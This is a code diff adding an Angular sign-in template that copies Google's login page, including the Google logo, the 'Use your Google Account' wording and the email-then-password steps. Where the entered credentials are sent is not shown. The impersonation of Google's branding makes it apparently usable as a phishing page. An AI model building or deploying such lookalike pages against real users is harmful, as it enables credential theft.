@@ -1,0 +1,48 @@
+<div class="login-container">
+  <div class="login-card">
+    <div class="google-logo">
+      <img src="https://www.gstatic.com/images/branding/product/1x/gsa_ios_64dp.png" alt="Google Logo" />
+    </div>
+        <h1>Sign in</h1>
+        <p class="subtitle">Use your Google Account</p>
+   
+
+    <form (ngSubmit)="onNext()">
+        <!-- Email Step -->
+        @if (!showPassword) {
+            <div>
+                <div class="input-group">
+                    <input [(ngModel)]="email" name="email" type="text" placeholder="Email or phone" required />
+                </div>
+                <a class="link" href="#">Forgot email?</a>
+
+                <p class="hint">
+                    Not your computer? Use Guest mode to sign in privately.
+                    <a class="link" href="https://support.google.com/chrome/answer/6130773?hl=de&co=GENIE.Platform%3DDesktop">Learn more</a>
+                </p>
+                @if (errorMsg) {
+                    <p class="error">{{ errorMsg }}</p>
+                }
+            </div>
+        }
+        @else {
+            <div>
+                <div class="input-group">
+                    <input [(ngModel)]="password" name="password" type="password" placeholder="Enter your password" required />
+                </div>
+                <a class="link" href="#">Forgot password?</a>
+            </div>
+        }
+
+        
+
+        <!-- Actions -->
+        <div class="actions">
+            <a class="link" href="#">Create account</a>
+            <button type="submit" class="btn-next">
+            {{ showPassword ? 'Login' : 'Next' }}
+            </button>
+        </div>
+    </form>
+  </div>
+</div>
